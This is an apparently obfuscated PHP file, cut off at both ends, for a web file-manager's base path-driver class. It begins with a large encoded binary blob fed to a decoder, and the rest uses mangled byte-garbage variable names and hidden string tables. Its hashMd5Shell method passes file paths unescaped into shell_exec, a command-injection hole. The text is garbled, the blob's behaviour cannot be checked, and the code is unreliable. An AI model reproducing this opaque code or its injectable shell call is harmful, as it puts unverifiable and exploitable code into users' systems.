—|’"\')H¡#b®í')."\46\211\167\74\34\274\20\370\157\306\362\215\111\236\262\251\24\330\325\17\347\16\172\0\140\21\177\44\133\212\163\75\147\346\364\213\371\2\323\330\5\226\226\315\112\373\154\345\23"."\x4b\xd9\x93\xac\x8\xf9\x6\xf9\xfb\x9e\x95\x22\x6e\xb\x37\xf7\xf3\xac\xdd\xec\x21\x73\xf2\xf2\x6a\x6f\xa5\x8c\x82\xc\xf1\x83\x51\x5\x3c\xa6\x20\xc6\xf\x4b\x4f\x74\x1b\xc9\xc1\xa\xb7\xcf\x44"."\x57\xd3\xe9\x69\x5a\xe2\x3f\xca\xb2\x89\x36\x20\x36\x85\x79\x53\xf3\xb3\x50\x12\x9f\x8\x89\x8b\x3\x18\x3d\xd9\x20\x35\x5a\x60\x67\xc7\x5a\x20\xfa\xbd\x27\x31\xe2\x44\x4c\xdf\x81\x46\xc9\x74\xc9"."\x1\x2a\xa3\x66\x9\xc7\x9c\x38\x80\xf2\x70\xc3\x1c\x62\x93\x5e\xe7\xb3\xf7\x50\xa2\xc3\xf5\xc\x25\xcd\x64\xc9\x63\xeb\x90\xde\x97\x2b\x23\x94\x97\xe6\x74\x40\x2e\x82\xd5\xcb\x9d\x2\x2d\xfe\x80"."\170\235\373\105\361\172\257\253\72\376\22\247\23\327\35\257\101\122\5\16\264\100\142\130\312\301\344\126\344\2\210\134\336\172\313\313\120\274\216\213\74\343\254\254\312\353\233\67\112"."\x8\xf1\x70\x48\x1e\xf\x46\x27\x3a\x8b\x26\xe1\x5\x9d\x50\x2e\xf9\x91\x34\x75\xa5\x57\xb1\xcb\xd8\x3b\xa\x9e\xe4\x2b\xdb\xa4\x18\xc9\x74\xcc\x14\x3a\xfd\x89\x8b\x47\xc3\x24\x1e\xeb\x59\xd1\xae".base64_decode('jhpi3wSIjg4kbaZAGelZarwwhcNHrJdMZJAyH8BMDiWNfQA5JIWW/DiIsyS2wXAuwQ==').base64_decode('BZWyJc2iJWXj8Ep5MWLKkhA5DT8pbDumSDw+4H50gMgH6JHfcfKHu2EZJF2dIvY95Q==')."\x7c\xc5\x84\x24\x12\x30\xf3\xd\xa\x35\x48\x97\x7f\xce\xbb\x57\xee\xd4\xbc\x8c\xdc\x96\x8c\xb0\x94\x4c\x4a\x31\x97\x73\xe8\x17\x9b\x65\x86\x84\x47\x9\x92\x4c\xaf\x35\x2\x43\x1a\x77\xda\xe2\x2e"."\xe5\x7c\xc8\x5c\xba\xa9\x4d\x12\x84\xc\x96\x5f\xc6\x89\x3b\x42\x89\x59\x61\xc5\xf0\xd9\x4a\xec\x23\x2e\x78\xa5\x77\xb9\xd3\xda\x90\xe0\xb4\x4\x77\x9f\x4a\xb5\x69\x43\x15\xb2\xa6\xd8\xf9\x86\x43"."\21\204\147\45\234\232\144\221\54\354\1\364\141\367\303\305\76\331\212\331\221\261\34\52\54\226\245\362\342\132\106\164\23\303\52\165\237\54\64\147\161\331\42\232\43\225\0\321\167"."\x28\xb8\x2a\x98\x74\x92\xc2\xaa\x1a\x42\x47\x8c\x76\x85\xb\xc\xc4\x27\x9d\xf6\xd7\x3c\x1b\x9f\x33\x94\x87\x98\x1d\x79\x1d\x50\xd7\xd9\x10\xcb\x66\x18\xdb\xe1\x4a\xb2\xe4\x47\x87\x9d\x17\xb0\xb2"."\4\103\102\1\75\33\226\252\223\57\147\307\55\20\257\374\21\201\225\316\41\226\14\327\105\2\333\41\115\307\340\113\44\222\167\14\162\306\344\104\107\163\334\123\113\216\65\2\175"."\51\60\107\4\303\64\55\340\114\242\371\165\127\353\345\2\356\236\321\22\326\260\141\47\63\322\131\253\74\261\34\136\54\33\124\370\120\345\366\272\133\305\306\324\175\2\25\225\224".base64_decode('tUfS8EiYFcrQFlUsRpNwScHzOsqOMwS4LE3CZcuSWWFJYCOVs7WSNU73ygcPpBipCg==')."\x1d\x76\x9d\xf5\x69\xd6\xf1\xc6\xb3\x62\xe6\xf2\xcf\x1\xc6\xb9\x73\x13\xb1\x47\xe5\x56\x8\x69\x85\xeb\xa6\xbd\x52\x2b\x2a\x66\x1e\xb7\x15\x22\xb7\x6b\x17\xa8\x44\x6b\x59\x4a\x5\xea\x4a\x29\xc7"."\270\332\47\102\43\243\234\314\213\264\12\372\41\364\223\170\13\227\75\122\125\110\226\225\115\52\253\243\304\52\122\6\313\251\47\342\202\313\343\6\16\115\201\371\2\144\104\247\321".base64_decode('rDEoVOeY5vwkB/kv5QfzJt9SUkIzEmt1B4rucS6rzYnG+ZLkI7aiIr8Hyw7KT+lZjQ==')."\x5d\x35\x48\x16\x10\xf4\x58\x65\xda\x46\x52\x77\x3a\xa2\x95\x1d\x53\xd1\x74\xf6\x91\xac\x24\x8c\x74\xc9\x1\x85\x24\xc3\xa1\xc7\x50\x41\x52\x46\x40\xc0\xf6\x9\x91\x3c\xad\x4f\x62\x68\x4\x4e\x38"."\214\125\50\33\1\67\31\364\22\264\5\137\266\363\353\57\342\104\225\156\273\64\71\156\26\155\17\116\113\230\5\362\333\154\332\266\120\12\240\242\3\302\53\342\275\323\43\351\274".base64_decode('oJC468KNIpcoBG0J9SFBuI7FZ/K4TlMJzXJE8OUMj8hbI1zLtpVcF8cCgA7AfeYIcw==')."\x51\x89\x2d\xed\x45\x7b\xc4\xf5\x8d\xe6\xe6\x7\x5\x2b\x3\xa8\x28\x6b\xf0\x10\x7f\x6\x96\x9f\xa6\xf8\xe1\x99\x3\x2f\xa9\x3\x9e\x51\xf3\xd\x14\xfa\x1d\xc5\xe9\x3\x54\x5c\x39\xf6\xeb\x6a\x0"."\21\256\250\202\372\70\47\262\65\260\366\211\47\342\145\111\235\201\170\174\151\64\326\112\135\242\227\45\223\122\222\106\124\131\122\147\173\64\62\136\132\260\43\20\12\227\245\141\345"."\xa9\x88\x2a\xfc\x8a\xd1\xa4\x50\x27\x69\x25\xb9\x81\x1c\xaf\x15\xa1\x96\xc5\xa2\x25\xe4\xae\x5b\xdc\xc\x14\x32\x26\x13\xf8\xb3\x9b\x93\xb8\x96\x65\x72\x0\xc9\xe6\x56\xcf\x9\x87\x72\xa2\x8c\x53"."\xbc\x21\xcf\xab\xc5\x3c\x3f\xf2\x80\xf3\x7d\x21\x97\x8e\x22\x43\x58\xa8\x8\x2b\x3e\x45\xa0\xee\x18\x7b\x5b\x13\xbb\x88\xe7\xeb\x9e\xf3\xdc\xe2\xf2\xde\xe7\xb8\xe4\x97\xe0\x64\x6d\x10\x62\x23\xe1"."\x9c\xbc\x27\x13\xc0\x94\x8a\x3\x24\x4b\x95\xcb\x6f\x39\x48\xaa\x18\x0\xdc\xb0\x45\x26\x68\xcd\xd\x98\x7d\xd2\x2d\x6\x3d\xf1\x80\x61\x2b\xc\xa9\xa4\xdc\x46\xc3\x8e\x64\x5b\xeb\xaf\x78\xd7\x4d"."\245\207\170\365\13\271\336\377\1\221\233\34\12\266\255\0\0"."".base64_decode('').strrev('')."", 10, -8))); goto bºˆÄ·ƒ™¾; Fğ«ùÎ£Û: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $Œì¯£§Ÿ =& $_SERVER[™»È’øè]; $this->objectDriver = array($Œì¯£§Ÿ[60], $Œì¯£§Ÿ[61], $Œì¯£§Ÿ[62], $Œì¯£§Ÿ[63], $Œì¯£§Ÿ[64], $Œì¯£§Ÿ[65], $Œì¯£§Ÿ[66], $Œì¯£§Ÿ[67], $Œì¯£§Ÿ[68]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($À ¾¨¾) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($À ¾¨¾, $_SERVER[™»È’øè][8]); } return $À ¾¨¾; } public function iconvApp($Ë„±ãã) { return $Ë„±ãã; } public function iconvSystem($¶÷¨ İ«) { return $¶÷¨ İ«; } public function iconvTo($©úÔÈ‹, $ÍŸÁŸî, $çïä®º¥) { $Ïıæ˜û· =& $_SERVER[™»È’øè]; if (!$©úÔÈ‹ || !function_exists($Ïıæ˜û·[69])) { return $©úÔÈ‹; } static $õ÷°£‰ = array(); $Öæ«Ëò¾ = $ÍŸÁŸî . $Ïıæ˜û·[70] . $çïä®º¥ . $Ïıæ˜û·[71] . $©úÔÈ‹; if (isset($õ÷°£‰[$Öæ«Ëò¾])) { return $õ÷°£‰[$Öæ«Ëò¾]; } if (function_exists($Ïıæ˜û·[72])) { $¿áéÃíÑ = @mb_convert_encoding($©úÔÈ‹, $çïä®º¥, $ÍŸÁŸî); } else { $¿áéÃíÑ = @iconv($ÍŸÁŸî, $çïä®º¥, $©úÔÈ‹); } $¿áéÃíÑ = $¿áéÃíÑ ? $¿áéÃíÑ : $©úÔÈ‹; if (strstr($¿áéÃíÑ, $Ïıæ˜û·[73])) { $¿áéÃíÑ = str_replace($Ïıæ˜û·[73], $Ïıæ˜û·[11], $¿áéÃíÑ); } $õ÷°£‰[$ÍŸÁŸî . $Ïıæ˜û·[70] . $çïä®º¥ . $Ïıæ˜û·[71] . $©úÔÈ‹] = $¿áéÃíÑ; $õ÷°£‰[$çïä®º¥ . $Ïıæ˜û·[70] . $ÍŸÁŸî . $Ïıæ˜û·[71] . $©úÔÈ‹] = $©úÔÈ‹; $õ÷°£‰[$çïä®º¥ . $Ïıæ˜û·[70] . $ÍŸÁŸî . $Ïıæ˜û·[71] . $¿áéÃíÑ] = $©úÔÈ‹; $õ÷°£‰[$ÍŸÁŸî . $Ïıæ˜û·[70] . $çïä®º¥ . $Ïıæ˜û·[71] . $¿áéÃíÑ] = $¿áéÃíÑ; return $¿áéÃíÑ; } public function getPathInner($ éï½™) { $«¼±éï„ = IO::init($ éï½™); return $«¼±éï„->path; } public function getPathOuter($ÖœÊ®úƒ) { $œˆ™™¼ =& $_SERVER[™»È’øè]; $ùôæä›œ = strlen(trim($this->pathBase, $œˆ™™¼[8])); $ÖœÊ®úƒ = substr(trim($ÖœÊ®úƒ, $œˆ™™¼[8]), $ùôæä›œ); return $this->pathDriver . $œˆ™™¼[8] . ltrim($ÖœÊ®úƒ, $œˆ™™¼[8]); } public function isParentOf($éÃã¤€¡, $ƒõ×üñ¶) { $ğ§Šøı =& $_SERVER[™»È’øè]; $éÃã¤€¡ = rtrim(strtolower($éÃã¤€¡), $ğ§Šøı[8]) . $ğ§Šøı[8]; $ƒõ×üñ¶ = rtrim(strtolower($ƒõ×üñ¶), $ğ§Šøı[8]) . $ğ§Šøı[8]; $…•–Û = strpos($ƒõ×üñ¶, $éÃã¤€¡) === 0; return $…•–Û; } public function getType() { $¿¡ƒğ =& $_SERVER[™»È’øè]; $±şÄ—üÔ = str_replace($¿¡ƒğ[74], $¿¡ƒğ[12], get_class($this)); return strtolower($±şÄ—üÔ); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($†Â”íÔª, $Æ»Î³Œ‚) { $Š¿†Ï Ô =& $_SERVER[™»È’øè]; $şö‡²Ñ  = rtrim($†Â”íÔª, $Š¿†Ï Ô[8]) . $Š¿†Ï Ô[8] . $Æ»Î³Œ‚; $™íƒâÄŠ = $this->exist($şö‡²Ñ ); return $™íƒâÄŠ ? $şö‡²Ñ  : !1; } public function setModifyTime($À†‡ï¢…, $ÊğÍ© = '') { } public function renameObject($Å±™”ª, $ÓÉ±¼÷) { $éûåÒ¡š = $ÓÉ±¼÷; $Å±™”ª = $this->getPathOuter($Å±™”ª); $ÓÉ±¼÷ = $this->pathFather($Å±™”ª) . $ÓÉ±¼÷; $§™‘îöâ = IO::copy($Å±™”ª, $this->pathFather($Å±™”ª), REPEAT_RENAME_FOLDER, $éûåÒ¡š); if ($§™‘îöâ) { IO::remove($Å±™”ª); } return $§™‘îöâ ? $ÓÉ±¼÷ : !1; } public function tempFile($ğâ²Š¥Š = '', $˜‹íÃ = '') { if (!$ğâ²Š¥Š) { $ğâ²Š¥Š = rand_string(15); } $Ü×ı®¢‡ = TEMP_FILES . rand_string(15) . $_SERVER[™»È’øè][8]; @mkdir($Ü×ı®¢‡, DEFAULT_PERRMISSIONS, !0); $±øØ¥ˆ = $Ü×ı®¢‡ . $ğâ²Š¥Š; @touch($±øØ¥ˆ); if ($˜‹íÃ) { file_put_contents($±øØ¥ˆ, $˜‹íÃ); } return $±øØ¥ˆ; } public function tempFileRemve($¬ù¬Ñ¶¬) { @unlink($¬ù¬Ñ¶¬); @rmdir($this->pathFather($¬ù¬Ñ¶¬)); } public function mkfile($Ğì˜Œæö, $ûí±–éÙ = '', $öòò÷®º = REPEAT_RENAME) { } public function mkdir($ü¸ƒîÖÏ, $ßá¦íŒº = REPEAT_SKIP) { } public function delFile($€°ôíÕ) { } public function delFolder($îêÛÚÑ’) { } public function copyFile($Òæó’¹‡, $¬‘­‡‡™) { } public function moveFile($„ì±‹‡, $œ²ˆßø) { } public function remove($Ä¢ù†¡®) { if ($this->isFile($Ä¢ù†¡®)) { return $this->delFile($Ä¢ù†¡®); } return $this->delFolder($Ä¢ù†¡®); } public function rename($®´ğƒÍ–, $‰ƒ®“õ) { } public function exist($¶å’¥¥Š) { } public function findByHash($‚ùÓâš° = '', $ÉšÅàı = '') { return !1; } public function isFile($Ûä¬‡É›) { } public function isFolder($Îï”úá·) { } public function size($ì¸Œ™µå) { } public function info($—˜îôøé) { } public function infoSimple($ÜàÄ³ŒÂ) { return $this->info($ÜàÄ³ŒÂ); } public function infoAuth($ãü™ê¬ş) { return $this->info($ãü™ê¬ş); } public function infoFull($Ûî«“¨½) { return $this->info($Ûî«“¨½); } public function infoFullSimple($ºñ¾º­§) { return $this->info($ºñ¾º­§); } public function infoWithChildren($ÜÇÀøô×) { $êË±×Ä© =& $_SERVER[™»È’øè]; static $Øä¶„µ = array(); if (isset($Øä¶„µ[$ÜÇÀøô×])) { return $Øä¶„µ[$ÜÇÀøô×]; } $Ñù«Ì²– = $this->info($ÜÇÀøô×); if ($Ñù«Ì²– && $Ñù«Ì²–[$êË±×Ä©[33]] == $êË±×Ä©[75]) { $Ù—ßÆŞÏ = array($êË±×Ä©[76] => 0, $êË±×Ä©[77] => 0, $êË±×Ä©[78] => 0); $this->infoChildren($ÜÇÀøô×, $Ù—ßÆŞÏ); $Ñù«Ì²–[$êË±×Ä©[76]] = $Ù—ßÆŞÏ[$êË±×Ä©[76]]; $Ñù«Ì²–[$êË±×Ä©[79]] = array($êË±×Ä©[80] => $Ù—ßÆŞÏ[$êË±×Ä©[77]], $êË±×Ä©[81] => $Ù—ßÆŞÏ[$êË±×Ä©[78]]); $Øä¶„µ[$ÜÇÀøô×] = $Ñù«Ì²–; } return $Ñù«Ì²–; } public function listPath($ŸÂëÆÏ´, $ÚÃÓÂí = false) { } public function has($ï®Æçú—, $ûğÄÀŞÉ = false, $¯Ş¯õ„™ = false) { } public function canRead($”íÛÄá) { } public function canWrite($©ÅÒˆ´ş) { } public function getContent($ı‰üÀµ) { } public function setContent($Éöò‡şÍ, $üÀÛâÓà = '') { } protected function infoChildren($¹Â¥âÚ, &$«Ş¢“º¶) { $–â¿ªÖ‘ =& $_SERVER[™»È’øè]; check_abort_echo(); $Şıâóó = $this->listPath($¹Â¥âÚ, !0); $Şıâóó = array_merge($Şıâóó[$–â¿ªÖ‘[82]], $Şıâóó[$–â¿ªÖ‘[83]]); foreach ($Şıâóó as $–×Ş×Ê£) { if ($–×Ş×Ê£[$–â¿ªÖ‘[33]] == $–â¿ªÖ‘[75]) { $«Ş¢“º¶[$–â¿ªÖ‘[78]]++; $áç° ü = $this->getPathInner($–×Ş×Ê£[$–â¿ªÖ‘[84]]); $this->infoChildren($áç° ü, $«Ş¢“º¶); } else { $«Ş¢“º¶[$–â¿ªÖ‘[77]]++; $«Ş¢“º¶[$–â¿ªÖ‘[76]] += $–×Ş×Ê£[$–â¿ªÖ‘[76]]; } } } public function fileSubstr($éÎºËÚ, $‹ÆŠüÚ®, $¢ñ…åüØ) { } public function listAll($ô£À”¨Ò) { } public function listAllMake($šóà»»‰, &$†Òî‰ƒ) { $™Ÿ—‚°ø =& $_SERVER[™»È’øè]; check_abort_echo(); $ÒÜ‰—ö¾ = $this->listPath($šóà»»‰, !0); if (!$ÒÜ‰—ö¾) { return; } $‹é®­â¾ = array_merge($ÒÜ‰—ö¾[$™Ÿ—‚°ø[82]], $ÒÜ‰—ö¾[$™Ÿ—‚°ø[83]]); foreach ($‹é®­â¾ as $è—Ÿ½ø÷) { $£ÂÓå§› = $è—Ÿ½ø÷[$™Ÿ—‚°ø[33]] == $™Ÿ—‚°ø[75]; $ëóæ‹§î = array($™Ÿ—‚°ø[84] => $è—Ÿ½ø÷[$™Ÿ—‚°ø[84]], $™Ÿ—‚°ø[75] => $£ÂÓå§›); if (isset($è—Ÿ½ø÷[$™Ÿ—‚°ø[76]])) { $ëóæ‹§î[$™Ÿ—‚°ø[76]] = $è—Ÿ½ø÷[$™Ÿ—‚°ø[76]]; } if (isset($è—Ÿ½ø÷[$™Ÿ—‚°ø[85]])) { $ëóæ‹§î[$™Ÿ—‚°ø[85]] = $è—Ÿ½ø÷[$™Ÿ—‚°ø[85]]; } if (!$£ÂÓå§›) { $†Òî‰ƒ[] = $ëóæ‹§î; continue; } $†Òî‰ƒ[] = $ëóæ‹§î; $ıèÎ£ıÎ = $è—Ÿ½ø÷[$™Ÿ—‚°ø[84]]; $Ø„Ó‘¨ = $this->pathDriver; if (substr($è—Ÿ½ø÷[$™Ÿ—‚°ø[84]], 0, strlen($Ø„Ó‘¨)) == $Ø„Ó‘¨) { $ıèÎ£ıÎ = substr($ıèÎ£ıÎ, strlen($Ø„Ó‘¨)); } $this->listAllMake($ıèÎ£ıÎ, $†Òî‰ƒ); } } public function listAllSimple($Ø¶Èºâ, $ˆƒ³‹‰ğ = false) { $Õ˜âÌ° = $this->listAll($Ø¶Èºâ); return $this->listAllSimpleMake($Õ˜âÌ°, $this->getPathOuter($Ø¶Èºâ), $ˆƒ³‹‰ğ); } public function listAllSimpleMake($‹ĞË˜î, $•˜Ÿïı, $ç®¯Ø³) { $‹É’òÏÎ =& $_SERVER[™»È’øè]; $Ú¹ìº†‹ = array(); $•˜Ÿïı = rtrim(get_path_father($•˜Ÿïı), $‹É’òÏÎ[8]) . $‹É’òÏÎ[8]; foreach ($‹ĞË˜î as $ò×»âúÈ) { $¡®’ì­« = array($‹É’òÏÎ[84] => $ò×»âúÈ[$‹É’òÏÎ[84]], $‹É’òÏÎ[86] => $ò×»âúÈ[$‹É’òÏÎ[84]], $‹É’òÏÎ[75] => $ò×»âúÈ[$‹É’òÏÎ[75]]); if (isset($ò×»âúÈ[$‹É’òÏÎ[76]]) && !$ò×»âúÈ[$‹É’òÏÎ[75]]) { $¡®’ì­«[$‹É’òÏÎ[76]] = $ò×»âúÈ[$‹É’òÏÎ[76]]; } if (isset($ò×»âúÈ[$‹É’òÏÎ[85]])) { $¡®’ì­«[$‹É’òÏÎ[85]] = $ò×»âúÈ[$‹É’òÏÎ[85]]; } if (is_array($ò×»âúÈ[$‹É’òÏÎ[87]])) { $¡®’ì­«[$‹É’òÏÎ[86]] = $ò×»âúÈ[$‹É’òÏÎ[87]][$‹É’òÏÎ[84]]; $¡®’ì­«[$‹É’òÏÎ[76]] = $ò×»âúÈ[$‹É’òÏÎ[87]][$‹É’òÏÎ[76]]; $¡®’ì­«[$‹É’òÏÎ[85]] = $ò×»âúÈ[$‹É’òÏÎ[87]][$‹É’òÏÎ[85]]; } else { if (substr($ò×»âúÈ[$‹É’òÏÎ[84]], 0, strlen($•˜Ÿïı)) == $•˜Ÿïı) { $¡®’ì­«[$‹É’òÏÎ[84]] = substr($ò×»âúÈ[$‹É’òÏÎ[84]], strlen($•˜Ÿïı)); } } $è«ıëÉ = $ò×»âúÈ[$‹É’òÏÎ[75]] ? $‹É’òÏÎ[8] : $‹É’òÏÎ[12]; $¡®’ì­«[$‹É’òÏÎ[86]] = rtrim($¡®’ì­«[$‹É’òÏÎ[86]], $‹É’òÏÎ[8]) . $è«ıëÉ; $¡®’ì­«[$‹É’òÏÎ[84]] = $‹É’òÏÎ[8] . trim($¡®’ì­«[$‹É’òÏÎ[84]], $‹É’òÏÎ[8]) . $è«ıëÉ; if (!$ç®¯Ø³) { $‹†Ô÷£Ì = explode($‹É’òÏÎ[8], trim($¡®’ì­«[$‹É’òÏÎ[84]], $‹É’òÏÎ[8])); $¡®’ì­«[$‹É’òÏÎ[84]] = $‹É’òÏÎ[8] . implode($‹É’òÏÎ[8], array_slice($‹†Ô÷£Ì, 1)) . $è«ıëÉ; } $Ú¹ìº†‹[] = $¡®’ì­«; } return array_sort_by($Ú¹ìº†‹, $‹É’òÏÎ[84]); } public function upload($Í™Õ±öß, $´Å„‘Ÿ, $±ıåèœƒ = false, $üïŞ±í = REPEAT_REPLACE) { } public function uploadFileByID($ÁÜÚÄ”ô, $¼’¤Êš¨, $Å¬¼¬‡ê) { } public function uploadFileByPath($ûÌöÏÓÚ, $­ã °¨², $Í‚“‰ğˆ = array()) { } public function isUploadServer() { $æˆŸˆœ =& $_SERVER[™»È’øè]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $æˆŸˆœ[88]) { return !0; } return $GLOBALS[$æˆŸˆœ[6]][$æˆŸˆœ[89]][$æˆŸˆœ[90]]; } public function isFileOutServer() { $Ûç—ìõî =& $_SERVER[™»È’øè]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $Ûç—ìõî[88]) { return !0; } return $GLOBALS[$Ûç—ìõî[6]][$Ûç—ìõî[89]][$Ûç—ìõî[91]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($ƒ®×ş§õ) { $øåô§ˆ» =& $_SERVER[™»È’øè]; if (!$this->isCdnHost()) { return $ƒ®×ş§õ; } return str_replace(trim(get_url_root($ƒ®×ş§õ), $øåô§ˆ»[8]), trim($this->cdnHost, $øåô§ˆ»[8]), $ƒ®×ş§õ); } public function uploadLink($ãùÏ†Şò, $åÅú±èÀ = 0) { $ö››Ÿµ¤ =& $_SERVER[™»È’øè]; if ($this->isUploadServer()) { return; } $Íü´Ï× = $this->getType(); if (!in_array($Íü´Ï×, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $Ç¿¯ú¾˜ = 1024 * 1024 * 10; $Õ÷Ê‘‹ê = $åÅú±èÀ <= $Ç¿¯ú¾˜ ? $ö››Ÿµ¤[92] : $ö››Ÿµ¤[93]; $¤ë°“Õ = (!$åÅú±èÀ ? 1 : ceil($åÅú±èÀ / pow(1024, 3))) * 3600 * 4; $ÒÕóºÍ® = $this->{$Õ÷Ê‘‹ê}($ãùÏ†Şò, $¤ë°“Õ); if ($ÒÕóºÍ®) { $ÒÕóºÍ®[$ö››Ÿµ¤[94]] = $ãùÏ†Şò; $ÒÕóºÍ®[$ö››Ÿµ¤[95]] = $Íü´Ï×; } return $ÒÕóºÍ®; } public function uploadFormData($•—‡ó“û, $™ˆƒÈœÉ = 3600) { } public function multiUploadFormData($µşı¥–‹, $öáµäìë = 3600) { } public function download($ç§˜É…Ï, $›ÃïÒ…Ü) { } public function ext($ÀÑÁù’¥) { $½ŸëÇÈæ =& $_SERVER[™»È’øè]; if (strpos($ÀÑÁù’¥, $½ŸëÇÈæ[8]) === -1) { $×å•ıŒØ = $ÀÑÁù’¥; } else { $×å•ıŒØ = $this->pathThis($ÀÑÁù’¥); } $¹¡ì¤œ = $½ŸëÇÈæ[12]; if (strstr($×å•ıŒØ, $½ŸëÇÈæ[10])) { $¹¡ì¤œ = substr($×å•ıŒØ, strrpos($×å•ıŒØ, $½ŸëÇÈæ[10]) + 1); $¹¡ì¤œ = strtolower($¹¡ì¤œ); } if (strlen($¹¡ì¤œ) > 3 && preg_match($½ŸëÇÈæ[96], $¹¡ì¤œ, $íñÌ¤ß)) { $¹¡ì¤œ = $½ŸëÇÈæ[12]; } return $¹¡ì¤œ; } public function pathThis($áà¯ “Ì) { $‰ã©ÏœÜ =& $_SERVER[™»È’øè]; $áà¯ “Ì = str_replace($‰ã©ÏœÜ[97], $‰ã©ÏœÜ[8], rtrim($áà¯ “Ì, $‰ã©ÏœÜ[8])); $•¡ª°îË = strrpos($áà¯ “Ì, $‰ã©ÏœÜ[8]); if ($•¡ª°îË === !1) { return $áà¯ “Ì; } return substr($áà¯ “Ì, $•¡ª°îË + 1); } public function pathFather($ë¥êÃ) { $‰ü°”• =& $_SERVER[™»È’øè]; $ë¥êÃ = str_replace($‰ü°”•[97], $‰ü°”•[8], rtrim($ë¥êÃ, $‰ü°”•[8])); $ˆİû²Ô = strrpos($ë¥êÃ, $‰ü°”•[8]); if ($ˆİû²Ô === !1) { return $‰ü°”•[12]; } return substr($ë¥êÃ, 0, $ˆİû²Ô + 1); } public function hashSimple($Ò“€îÂ£) { $¤˜¨Ãæ¼ =& $_SERVER[™»È’øè]; if (!$Ò“€îÂ£) { return md5($¤˜¨Ãæ¼[12]); } $¦¥‹²ƒò = $this->size($Ò“€îÂ£); $øÏäù‹ª = 200; $•óçù€ = 50; if ($¦¥‹²ƒò <= $øÏäù‹ª * $•óçù€) { return $this->hashMd5($Ò“€îÂ£) . $¦¥‹²ƒò; } $é©©ºí§ = intval($¦¥‹²ƒò / $•óçù€); $ı®èøÅØ = $¤˜¨Ãæ¼[12]; for ($ˆÆ±ŒÒ” = 0; $ˆÆ±ŒÒ” < $•óçù€; $ˆÆ±ŒÒ”++) { $ı®èøÅØ .= $this->fileSubstr($Ò“€îÂ£, $é©©ºí§ * $ˆÆ±ŒÒ”, $øÏäù‹ª); } $ı®èøÅØ .= $this->fileSubstr($Ò“€îÂ£, $¦¥‹²ƒò - $øÏäù‹ª, $øÏäù‹ª); return md5($ı®èøÅØ) . $¦¥‹²ƒò; } public static $md5Cache = array(); public function hashMd5($ÈëÔãŞó) { if (!$ÈëÔãŞó) { return md5($_SERVER[™»È’øè][12]); } $ÈëÔãŞó = $this->iconvSystem($ÈëÔãŞó); if (isset(self::$md5Cache[$ÈëÔãŞó])) { return self::$md5Cache[$ÈëÔãŞó]; } self::$md5Cache[$ÈëÔãŞó] = $this->hashMd5Shell($ÈëÔãŞó); if (!self::$md5Cache[$ÈëÔãŞó]) { self::$md5Cache[$ÈëÔãŞó] = @md5_file($ÈëÔãŞó); } return self::$md5Cache[$ÈëÔãŞó]; } private function hashMd5Shell($æÚÁî) { $Í®¸ĞÁ‡ =& $_SERVER[™»È’øè]; if (!$æÚÁî) { return md5($Í®¸ĞÁ‡[12]); } if (!function_exists($Í®¸ĞÁ‡[98])) { return !1; } $Ë‚«×¸­ = array($Í®¸ĞÁ‡[99], $Í®¸ĞÁ‡[100]); $ò„ÎÆêÅ = Cache::get($Í®¸ĞÁ‡[101]); if (!$ò„ÎÆêÅ) { $­ÙŒşÍÌ = BASIC_PATH . $Í®¸ĞÁ‡[102]; $¸Ö˜¸¹ = md5_file($­ÙŒşÍÌ); $ò„ÎÆêÅ = $Í®¸ĞÁ‡[103]; foreach ($Ë‚«×¸­ as $¦Ñæ¬ÛÂ) { $¯Àª­¶¬ = shell_exec($¦Ñæ¬ÛÂ . "\40\42{$­ÙŒşÍÌ}\x22"); if ($¯Àª­¶¬ && substr(trim($¯Àª­¶¬), 0, 32) == $¸Ö˜¸¹) { $ò„ÎÆêÅ = $¦Ñæ¬ÛÂ; break; } } Cache::set($Í®¸ĞÁ‡[101], $ò„ÎÆêÅ, 3600); } if ($ò„ÎÆêÅ == $Í®¸ĞÁ‡[103]) { return !1; } $¯Àª­¶¬ = shell_exec($ò„ÎÆêÅ . "\40\x22{$æÚÁî}\x22"); $¯Àª­¶¬ = str_replace($Í®¸ĞÁ‡[104], $Í®¸ĞÁ‡[12], $¯Àª­¶¬); return substr($¯Àª­¶¬, 0, 32); } public function link($¥½ü÷¿ê) { return $¥½ü÷¿ê; } public function fileOut($îÀöí”Ä, $‹’Ï©« = false, $ É¼±é² = false, $¹¹­«–£ = '') { $á‹»»»­ =& $_SERVER[™»È’øè]; $this->cacheMethod(null, null); if (!$îÀöí”Ä || !$this->exist($îÀöí”Ä)) { show_json(LNG($á‹»»»­[105]), !1, $ É¼±é²); } $‰”Ï¾Ûè = $this->getType() == $á‹»»»­[106]; $¨ÒÖğÅ = $GLOBALS[$á‹»»»­[6]][$á‹»»»­[89]][$á‹»»»­[107]][$á‹»»»­[108]]; $´îıäèä = (double) $GLOBALS[$á‹»»»­[6]][$á‹»»»­[89]][$á‹»»»­[107]][$á‹»»»­[109]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $Û–µÆ‘ = $this->infoFull($îÀöí”Ä); $ÏŒò¨½ = $Û–µÆ‘[$á‹»»»­[76]]; $œ•‘¡­¥ = gmdate($á‹»»»­[110], $Û–µÆ‘[$á‹»»»­[85]]); $ğ¹¿¬š« = $ É¼±é² ? $ É¼±é² : $this->iconvApp($Û–µÆ‘[$á‹»»»­[32]]); $ÒÜ·Óøû = 0; $Æ½›Ÿå = $ÏŒò¨½ - 1; $»¾Íàó÷ = $this->ext($ğ¹¿¬š«); if (in_array($»¾Íàó÷, array($á‹»»»­[111], $á‹»»»­[112], $á‹»»»­[113], $á‹»»»­[114]))) { $»¾Íàó÷ = $á‹»»»­[115]; } if (in_array($»¾Íàó÷, array($á‹»»»­[116]))) { $»¾Íàó÷ = $á‹»»»­[117]; } if (!$¹¹­«–£) { $¹¹­«–£ = md5($œ•‘¡­¥ . $this->hashSimple($îÀöí”Ä)); } $¹¹­«–£ = $á‹»»»­[118] . $¹¹­«–£ . $á‹»»»­[118]; $€¹ñ¿‡ö = get_file_mime($»¾Íàó÷); $èÍ–·ôå = !0; $èÍ–·ôå = isset($_GET[$á‹»»»­[119]]) ? !1 : !0; if 